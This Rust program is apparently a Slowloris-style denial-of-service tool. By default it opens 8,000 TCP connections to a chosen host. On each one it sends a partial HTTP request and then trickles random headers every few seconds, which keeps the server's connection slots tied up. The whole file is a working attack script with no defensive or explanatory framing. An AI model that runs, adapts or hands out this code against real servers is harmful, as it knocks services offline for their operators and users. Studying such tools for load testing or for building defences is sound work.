use anyhow::Result;
use clap::Parser;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use std::time::Duration;
use tokio::io::{AsyncWriteExt, BufWriter};
use tokio::net::TcpStream;
use tokio::time::{sleep, timeout};

#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Args {
    #[arg(short = 'H', long)]          // <-- changed from short = 'h'
    host: String,

    #[arg(short, long, default_value_t = 80)]
    port: u16,

    #[arg(short, long, default_value_t = 8000)]
    sockets: usize,

    #[arg(long, default_value_t = 15)]
    interval: u64,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    println!(
        "[*] Starting {} slow sockets to {}:{}",
        args.sockets, args.host, args.port
    );

    let mut handles = Vec::with_capacity(args.sockets);
    for id in 0..args.sockets {
        handles.push(tokio::spawn(worker(
            id,
            args.host.clone(),
                                         args.port,
                                         args.interval,
        )));
    }

    for h in handles {
        let _ = h.await;
    }
    Ok(())
}

async fn worker(id: usize, host: String, port: u16, interval: u64) {
    loop {
        if let Err(e) = connect_and_hold(id, &host, port, interval).await {
            eprintln!("[{}] connection lost: {}", id, e);
        }
        sleep(Duration::from_millis(100)).await;
    }
}

async fn connect_and_hold(_id: usize, host: &str, port: u16, interval: u64) -> Result<()> {
    let stream = timeout(Duration::from_secs(10), TcpStream::connect((host, port)))
    .await??
    .into_split();
    let mut writer = BufWriter::new(stream.1);

    let req = format!(
        "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n",
        host
    );
    writer.write_all(req.as_bytes()).await?;

    let mut rng = StdRng::from_entropy();

    loop {
        let header = format!("X-{}: {}\r\n", rng.gen::<u32>(), rng.gen::<u32>());
        writer.write_all(header.as_bytes()).await?;
        writer.flush().await?;
        sleep(Duration::from_secs(interval)).await;
    }
}
